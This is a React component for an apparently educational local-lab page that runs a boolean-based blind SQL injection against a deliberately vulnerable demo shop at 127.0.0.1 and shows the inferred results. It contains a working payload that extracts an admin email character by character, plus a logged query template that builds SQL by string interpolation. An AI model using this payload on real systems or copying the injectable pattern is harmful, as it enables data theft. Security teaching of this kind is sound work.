import React, { useState, useEffect, useRef } from 'react';
import { Link } from 'react-router-dom';
import { ArrowLeft, Globe, Terminal, Play, RotateCcw, ShieldAlert, Server, Wifi, Cpu, CheckCircle2, XCircle, Code, Clock, BarChart4, Maximize2, Minimize2 } from 'lucide-react';
import { saveTestLog } from '../utils/logger';
import { executeAttack } from '../services/api';
import { delay, isErrorLine, getLineDelay, getPhaseAfterLine } from '../utils/terminalAnimation';

export default function RemoteBlindInjection() {
  const [targetUrl, setTargetUrl] = useState('http://127.0.0.1:2000/products?product_id=1');
  const [payload, setPayload] = useState("1' AND substr((SELECT email FROM users WHERE is_admin=1 LIMIT 1),1,1)='a' --");
  const [simulating, setSimulating] = useState(false);
  const [currentStep, setCurrentStep] = useState(0);
  const [consoleLogs, setConsoleLogs] = useState([]);
  const [terminalExpanded, setTerminalExpanded] = useState(false);
  const [simResult, setSimResult] = useState(null); // 'success' | 'failed' | null
  const [compareData, setCompareData] = useState(null);
  const scrollContainerRef = useRef(null);
  const terminalRef = useRef(null);
  const [expandedHeight, setExpandedHeight] = useState(null);
  const currentPhaseRef = useRef(0);

  const presets = [
    { name: "Golimar Products", url: "http://127.0.0.1:2000/products?product_id=1", payload: "1' AND substr((SELECT email FROM users WHERE is_admin=1 LIMIT 1),1,1)='a' --", desc: "Boolean-Based Blind SQL Injection demonstration." }
  ];

  const handlePresetSelect = (preset) => {
    if (simulating) return;
    setTargetUrl(preset.url);
    setPayload(preset.payload);
    setSimResult(null);
    setCompareData(null);
    setCurrentStep(0);
    setConsoleLogs([]);
  };

  useEffect(() => {
    if (consoleLogs.length === 0) return;
    const container = scrollContainerRef.current;
    if (container) {
      const threshold = 100;
      const isNearBottom = container.scrollHeight - container.scrollTop - container.clientHeight <= threshold;
      if (isNearBottom) {
        container.scrollTo({ top: container.scrollHeight, behavior: 'smooth' });
      }
    }
  }, [consoleLogs]);

  useEffect(() => {
    if (!terminalExpanded || !terminalRef.current) {
      setExpandedHeight(null);
      return;
    }
    const updateHeight = () => {
      const rect = terminalRef.current.getBoundingClientRect();
      const bottomGap = 16;
      setExpandedHeight(Math.max(window.innerHeight - rect.top - bottomGap, 300));
    };
    updateHeight();
    window.addEventListener('resize', updateHeight);
    return () => window.removeEventListener('resize', updateHeight);
  }, [terminalExpanded]);

  const addLog = (text, type = 'info', delay = 0) => {
    return new Promise((resolve) => {
      setTimeout(() => {
        setConsoleLogs((prev) => [...prev, { text, type, timestamp: new Date().toLocaleTimeString() }]);
        resolve();
      }, delay);
    });
  };

  const handleSimulate = async () => {
    if (simulating) return;
    if (!targetUrl) {
      alert("Please enter a target URL!");
      return;
    }
    if (!payload) {
      alert("Please enter a SQL injection payload!");
      return;
    }

    setSimulating(true);
    setSimResult(null);
    setCompareData(null);
    setCurrentStep(0);
    currentPhaseRef.current = 0;
    setConsoleLogs([]);

    try {
      setCurrentStep(0);
      currentPhaseRef.current = 0;
      const res = await executeAttack('blind', targetUrl, payload);
      
      if (res && res.success) {
        const output = res.output || '';
        const lines = output.split('\n');
        const parsedLogs = lines.map(line => {
          let type = 'info';
          if (line.includes('[SYSTEM]')) type = 'system';
          else if (line.includes('[SUCCESS]') || line.includes('SUCCESS!') || line.includes('SUCCESS') || line.includes('[CONNECT] Connection successfully established.') || line.includes('[DNS] Resolved hostname to server endpoint IP:')) type = 'success';
          else if (line.includes('[WARNING]') || line.includes('[HTTP]') || line.includes('[PROBE]') || line.includes('[PAYLOAD]') || line.includes('[RESPONSE]') || line.includes('[INFO]') || line.includes('[DNS]') || line.includes('[LATENCY]')) type = 'warning';
          else if (line.includes('[ERROR]') || line.includes('[RESULT] FAILED') || line.includes('FAILED') || line.includes('EXPLOIT FAILED')) type = 'danger';
          return {
            text: line,
            type,
            timestamp: new Date().toLocaleTimeString()
          };
        });
        setConsoleLogs([]);
        setCurrentStep(0);
        currentPhaseRef.current = 0;
        
        const context = {
          sawTimeLine: false
        };

        for (const log of parsedLogs) {
          // 1. Print line first
          setConsoleLogs((prev) => [...prev, log]);

          if (log.text.includes("[TIME]")) {
            context.sawTimeLine = true;
          }

          // 2. Wait line-specific delay
          const lineDelay = getLineDelay(log.text);
          await delay(lineDelay);

          // 3. Error handling: if error line, break and stop animation
          if (isErrorLine(log.text)) {
            break;
          }

          // 4. Update status phase if needed
          const nextPhase = getPhaseAfterLine(log.text, currentPhaseRef.current, context);
          if (nextPhase > currentPhaseRef.current) {
            currentPhaseRef.current = nextPhase;
            setCurrentStep(nextPhase);
          }
        }

        const hasError = parsedLogs.some(l => isErrorLine(l.text));
        if (!hasError) {
          setCurrentStep(5);
          currentPhaseRef.current = 5;
        }

        const isSuccess = res.hasOwnProperty('blind_condition') ? res.blind_condition : output.includes("SUCCESS!");
        if (isSuccess && !hasError) {
          setSimResult('success');
          saveTestLog('Blind SQLi', payload, 'EXPLOITED', `SELECT p.*, c.slug AS category_slug, c.name AS category_name FROM products p LEFT JOIN categories c ON c.id = p.category_id WHERE p.id = '${payload}' AND p.is_active = 1`);

          const sizeKb = res.response_length ? (res.response_length / 1024).toFixed(1) : '41.2';
          setCompareData({
            type: 'Boolean-Based (TRUE)',
            sent: payload,
            latency: res.elapsed_ms ? `${res.elapsed_ms}ms` : '24ms',
            bodySize: res.response_length ? `${res.response_length.toLocaleString()} bytes (${sizeKb} kB)` : '41.2 kB',
            state: 'TRUE (Record Exists)',
            detail: 'The server evaluated the query predicate as TRUE. The requested product card is returned and displayed successfully.'
          });
        } else {
          setSimResult('failed');
          saveTestLog('Blind SQLi', payload, 'BLOCKED', `SELECT p.*, c.slug AS category_slug, c.name AS category_name FROM products p LEFT JOIN categories c ON c.id = p.category_id WHERE p.id = '${payload}' AND p.is_active = 1`);
          
          if (!hasError && res.http_request_completed) {
            const sizeKb = res.response_length ? (res.response_length / 1024).toFixed(1) : '38.7';
            setCompareData({
              type: 'Boolean-Based (FALSE)',
              sent: payload,
              latency: res.elapsed_ms ? `${res.elapsed_ms}ms` : '22ms',
              bodySize: res.response_length ? `${res.response_length.toLocaleString()} bytes (${sizeKb} kB)` : '38.7 kB',
              state: 'FALSE (Filtered Out)',
              detail: 'The query predicate evaluated to FALSE. The server returned a page with zero products and no product cards are displayed.'
            });
          } else {
            setCompareData(null);
          }
        }
      } else {
        setCurrentStep(0);
        const errorMsg = res.error || '';
        let displayError = '[ERROR] Attack execution failed';
        if (errorMsg.toLowerCase().includes('timeout')) {
          displayError = '[ERROR] Connection timeout';
        } else if (errorMsg.toLowerCase().includes('500') || errorMsg.toLowerCase().includes('internal server error')) {
          displayError = '[ERROR] Internal server error';
        }
        setConsoleLogs([{ text: displayError, type: 'danger', timestamp: new Date().toLocaleTimeString() }]);
        setSimResult('failed');
      }
    } catch (err) {
      setCurrentStep(0);
      let displayError = '[ERROR] Attack execution failed';
      if (err.message && err.message.toLowerCase().includes('timeout')) {
        displayError = '[ERROR] Connection timeout';
      } else if (err.message && (err.message.toLowerCase().includes('500') || err.message.toLowerCase().includes('server error'))) {
        displayError = '[ERROR] Internal server error';
      }
      setConsoleLogs([{ text: displayError, type: 'danger', timestamp: new Date().toLocaleTimeString() }]);
      setSimResult('failed');
    } finally {
      setSimulating(false);
    }
  };

  const handleClear = () => {
    if (simulating) return;
    setTargetUrl('http://127.0.0.1:2000/products?product_id=1');
    setPayload("1' AND substr((SELECT email FROM users WHERE is_admin=1 LIMIT 1),1,1)='a' --");
    setConsoleLogs([]);
    setCompareData(null);
    setSimResult(null);
    setCurrentStep(0);
    currentPhaseRef.current = 0;
  };

  return (
    <div className="space-y-8 select-none w-full">
      {/* Back Link */}
      <Link to="/instructions/blind-injection" className="inline-flex items-center gap-2 text-xs font-mono text-cyber-dim hover:text-cyber-blue transition-colors">
        <ArrowLeft className="w-3.5 h-3.5" />
        back to instructions page
      </Link>

      {/* Header Info */}
      <div className="flex flex-col gap-2 border-b border-cyber-border/40 pb-6 w-full">
        <h1 className="text-3xl font-extrabold text-cyber-title tracking-wide uppercase">
          Blind SQL <span className="text-cyber-blue">Injection</span>
        </h1>
        <p className="text-cyber-text text-sm text-justify w-full leading-relaxed font-medium">
          This educational local-lab demonstration sends a Blind SQL injection query to the vulnerable Golimar product details search endpoint and displays inferred logic states by observing differences in database-driven HTML responses.
        </p>
      </div>

      {/* Target Settings Card */}
      <div className="bg-cyber-card border border-cyber-border rounded-xl p-6 relative overflow-hidden space-y-5 shadow-lg w-full">
        <span className="absolute top-0 left-0 right-0 h-[2px] bg-cyber-blue" />
        <h3 className="font-sans font-bold text-base text-cyber-title tracking-widest uppercase flex items-center gap-2">
          <Server className="w-4 h-4 text-cyber-blue" />
          Target Settings
        </h3>

        <div className="space-y-4 font-mono text-xs">
          {/* Target URL */}
          <div className="space-y-1.5">
            <label className="block text-[11px] font-bold text-cyber-blue uppercase tracking-wider">
              Target Parameter URL
            </label>
            <div className="relative">
              <Globe className="absolute left-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-cyber-dim/60" />
              <input
                type="text"
                value={targetUrl}
                onChange={(e) => setTargetUrl(e.target.value)}
                disabled={simulating}
                placeholder="http://127.0.0.1:2000/products?product_id=1"
                className="w-full bg-cyber-input border border-cyber-border rounded-lg pl-10 pr-4 py-2.5 text-cyber-text placeholder-cyber-dim/40 focus:outline-none focus:border-cyber-blue focus:ring-1 focus:ring-cyber-blue/20 transition-all font-bold tracking-wide"
              />
            </div>
          </div>

          {/* SQL Payload */}
          <div className="space-y-1.5">
            <label className="block text-[11px] font-bold text-cyber-blue uppercase tracking-wider">
              Blind SQL Payload
            </label>
            <div className="relative">
              <Code className="absolute left-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-cyber-dim/60" />
              <input
                type="text"
                value={payload}
                onChange={(e) => setPayload(e.target.value)}
                disabled={simulating}
                placeholder="1' AND substr((SELECT email FROM users WHERE is_admin=1 LIMIT 1),1,1)='a' --"
                className="w-full bg-cyber-input border border-cyber-border rounded-lg pl-10 pr-4 py-2.5 text-cyber-text placeholder-cyber-dim/40 focus:outline-none focus:border-cyber-blue focus:ring-1 focus:ring-cyber-blue/20 transition-all text-cyber-red font-bold font-mono tracking-wider"
              />
            </div>
          </div>
        </div>

        {/* Execute & Reset Controls */}
        <div className="flex gap-3 pt-2">
          <button
            onClick={handleSimulate}
            disabled={simulating}
            className={`flex-1 flex items-center justify-center gap-2 bg-cyber-blue hover:bg-cyber-blue-light text-white py-3 rounded-lg text-xs font-bold uppercase tracking-wider transition-all cursor-pointer shadow-[0_0_15px_var(--accent-glow)] ${
              simulating ? 'opacity-50 cursor-not-allowed' : ''
            }`}
          >
            <Play className={`w-3.5 h-3.5 ${simulating ? 'animate-spin' : ''}`} />
            {simulating ? "Executing Inference..." : "Execute Injection"}
          </button>
          <button
            onClick={handleClear}
            disabled={simulating}
            className={`p-3 bg-transparent hover:bg-cyber-border/30 border border-cyber-border text-cyber-dim hover:text-cyber-text rounded-lg transition-all cursor-pointer ${
              simulating ? 'opacity-50 cursor-not-allowed' : ''
            }`}
            title="Reset Forms"
          >
            <RotateCcw className="w-4 h-4" />
          </button>
        </div>
      </div>

      {/* Quick Presets */}
      <div className="bg-cyber-card border border-cyber-border rounded-xl p-6 relative overflow-hidden space-y-4 w-full">
        <h3 className="font-sans font-bold text-xs text-cyber-dim tracking-widest uppercase">
          Vulnerable Blind Presets
        </h3>
        
        <div className="grid grid-cols-1 md:grid-cols-3 gap-4 font-mono">
          {presets.map((preset, idx) => (
            <button
              key={idx}
              onClick={() => handlePresetSelect(preset)}
              disabled={simulating}
              className="w-full text-left bg-cyber-black/40 hover:bg-cyber-blue/5 border border-cyber-border hover:border-cyber-blue/30 rounded-lg p-3.5 transition-all cursor-pointer group flex flex-col justify-between h-full"
            >
              <div className="w-full space-y-1.5">
                <div className="flex justify-between items-center gap-2">
                  <span className="text-xs font-bold text-cyber-title group-hover:text-cyber-blue transition-colors truncate">
                    {preset.name}
                  </span>
                  <span className="text-[8px] text-[#ffbd2e] border border-[#ffbd2e]/30 px-1.5 py-0.25 rounded bg-[#ffbd2e]/5 shrink-0 uppercase tracking-wider">
                    blind_verify
                  </span>
                </div>
                <div className="text-[10px] text-cyber-dim font-bold truncate">
                  URL: {preset.url}
                </div>
              </div>
              <div className="text-[10px] text-cyber-blue-light mt-3 font-mono w-full border-t border-cyber-border/30 pt-2 shrink-0">
                Payload: <code className="bg-cyber-input px-1 py-0.5 rounded text-cyber-red break-all">{preset.payload}</code>
              </div>
            </button>
          ))}
        </div>
      </div>

      {/* Console & Results (Bottom) */}
      <div className="w-full space-y-6 pt-4 flex flex-col items-center">
        {/* Simulation Progress Timeline */}
        <div className="bg-cyber-card border border-cyber-border rounded-xl p-5 font-mono text-xs space-y-4 shadow-lg w-full">
          <div className="flex items-center justify-between">
            <span className="text-[10px] font-bold text-cyber-blue tracking-wider uppercase flex items-center gap-1.5">
              <Cpu className="w-3.5 h-3.5 text-cyber-blue" />
              status
            </span>
            <span className="text-[10px] text-cyber-dim font-bold">
              {currentStep === 0 ? "STANDBY" : `STAGE ${currentStep} / 5`}
            </span>
          </div>

          {/* Micro Progress Bar */}
          <div className="w-full bg-cyber-black h-1.5 rounded-full overflow-hidden border border-cyber-border">
            <div 
              className="bg-cyber-blue h-full transition-all duration-500 shadow-[0_0_8px_var(--accent-glow)]"
              style={{ width: `${(currentStep / 5) * 100}%` }}
            />
          </div>

          {/* Stages Icons Grid */}
          <div className="grid grid-cols-5 gap-2 text-center text-[9px] font-bold tracking-wider text-cyber-dim">
            <div className={currentStep >= 1 ? "text-cyber-blue" : ""}>1. DNS</div>
            <div className={currentStep >= 2 ? "text-cyber-blue" : ""}>2. TCP</div>
            <div className={currentStep >= 3 ? "text-cyber-blue" : ""}>3. PROBING</div>
            <div className={currentStep >= 4 ? "text-cyber-blue" : ""}>4. INJECT</div>
            <div className={currentStep >= 5 ? "text-cyber-blue" : ""}>5. INFER</div>
          </div>
        </div>

        {/* Console Monitor Panel */}
        <div
          ref={terminalRef}
          className={`bg-cyber-pre border border-cyber-border rounded-xl w-full flex flex-col overflow-hidden shadow-2xl relative transition-all duration-300 ease-in-out ${
            terminalExpanded ? '' : 'h-[400px]'
          }`}
          style={terminalExpanded && expandedHeight ? { height: `${expandedHeight}px` } : undefined}
        >
          {/* Header bar */}
          <div className="bg-cyber-card border-b border-cyber-border/70 px-4 py-3 flex items-center justify-between shrink-0">
            <div className="flex items-center gap-2">
              <span className="text-[10px] font-mono font-bold text-cyber-dim tracking-wider uppercase flex items-center gap-1.5">
                <Terminal className="w-3.5 h-3.5" />
              </span>
            </div>
            <button
              onClick={() => setTerminalExpanded(prev => !prev)}
              className="flex items-center gap-1 text-[9px] font-mono text-cyber-dim hover:text-cyber-blue transition-colors cursor-pointer select-none"
            >
              {terminalExpanded ? (
                <>
                  <Minimize2 className="w-3.5 h-3.5" />
                  COLLAPSE
                </>
              ) : (
                <>
                  <Maximize2 className="w-3.5 h-3.5" />
                  EXPAND
                </>
              )}
            </button>
          </div>

          {/* Terminal Body */}
          <div ref={scrollContainerRef} className="flex-1 min-h-0 p-4 overflow-y-auto font-mono text-[11px] leading-relaxed space-y-2 custom-scrollbar">
            {consoleLogs.length === 0 ? (
              <div className="text-cyber-dim/40 h-full flex flex-col items-center justify-center text-center p-8 select-none">
                <Terminal className="w-10 h-10 mb-2 opacity-20" />
                <span>Blind SQL Injection terminal is ready.</span>
                <span className="text-[10px] block mt-1">Configure Target details and execute blind payload verification scripts to measure server behaviors.</span>
              </div>
            ) : (
              consoleLogs.map((log, index) => {
                let colorClass = "text-cyber-text";
                if (log.type === 'system') colorClass = "text-cyber-blue font-bold";
                if (log.type === 'success') colorClass = "text-cyber-green font-bold";
                if (log.type === 'warning') colorClass = "text-[#ffbd2e] font-bold";
                if (log.type === 'danger') colorClass = "text-[#ff3a3a] font-bold";
                
                return (
                  <div key={index} className={`flex items-start gap-2 ${colorClass}`}>
                    <span className="text-cyber-dim/50 shrink-0 font-normal">[{log.timestamp}]</span>
                    <span className="whitespace-pre-wrap select-text">{log.text}</span>
                  </div>
                );
              })
            )}
          </div>

          {/* Comparison Metrics Overlay */}
          {(simResult === 'success' || simResult === 'failed') && compareData && (
            <div className="border-t border-cyber-border/70 p-4 bg-cyber-card/95 backdrop-blur-sm shrink-0 animate-fade-in space-y-3 max-h-[240px] overflow-y-auto font-mono text-[11px]">
              <div className="flex items-center justify-between">
                <span className="text-[10px] font-bold text-cyber-blue uppercase tracking-wider flex items-center gap-1.5">
                  <BarChart4 className="w-3.5 h-3.5 text-cyber-blue animate-pulse" />
                  Blind SQLi Side-Channel Analysis
                </span>
                <span className="text-[9px] text-[#ffbd2e] border border-[#ffbd2e]/40 bg-[#ffbd2e]/10 px-2 py-0.5 rounded font-bold uppercase tracking-wider flex items-center gap-1">
                  <Clock className="w-2.5 h-2.5 animate-spin" />
                  METRICS MATCH
                </span>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-3 text-cyber-text">
                <div className="bg-cyber-black/40 border border-cyber-border/40 rounded-lg p-2.5 space-y-1.5">
                  <span className="text-[9px] uppercase tracking-wide text-cyber-dim font-bold">Execution Metrics:</span>
                  <div><span className="text-cyber-dim">Attack Mode:</span> <span className="text-cyber-blue-light">{compareData.type}</span></div>
                  <div><span className="text-cyber-dim">Response Latency:</span> <span className="text-cyber-green">{compareData.latency}</span></div>
                  <div><span className="text-cyber-dim">Body Content Size:</span> <span className="text-cyber-blue-light">{compareData.bodySize}</span></div>
                </div>

                <div className="bg-cyber-black/40 border border-cyber-border/40 rounded-lg p-2.5 space-y-1.5">
                  <span className="text-[9px] uppercase tracking-wide text-cyber-dim font-bold">Inferred Query State:</span>
                  <div><span className="text-cyber-dim">Evaluated logic:</span> <span className="text-cyber-red font-bold">{compareData.state}</span></div>
                  <p className="text-[10px] text-cyber-dim leading-snug">{compareData.detail}</p>
                </div>
              </div>
            </div>
          )}
        </div>
      </div>

      {/* Educational Caution Alert */}
      <div className="bg-cyber-blue/5 border border-cyber-blue/30 rounded-xl p-4 text-xs font-mono leading-relaxed text-cyber-blue-light flex gap-3 items-start w-full">
        <ShieldAlert className="w-5 h-5 shrink-0 text-cyber-blue animate-pulse" />
        <div>
          <span className="font-bold text-cyber-title uppercase block mb-1">🛡 LOCAL EDUCATIONAL LAB</span>
          This module sends real HTTP requests only to the configured local or private lab target. Use it exclusively in the intentionally vulnerable Golimar demonstration environment.
        </div>
      </div>
    </div>
  );
}
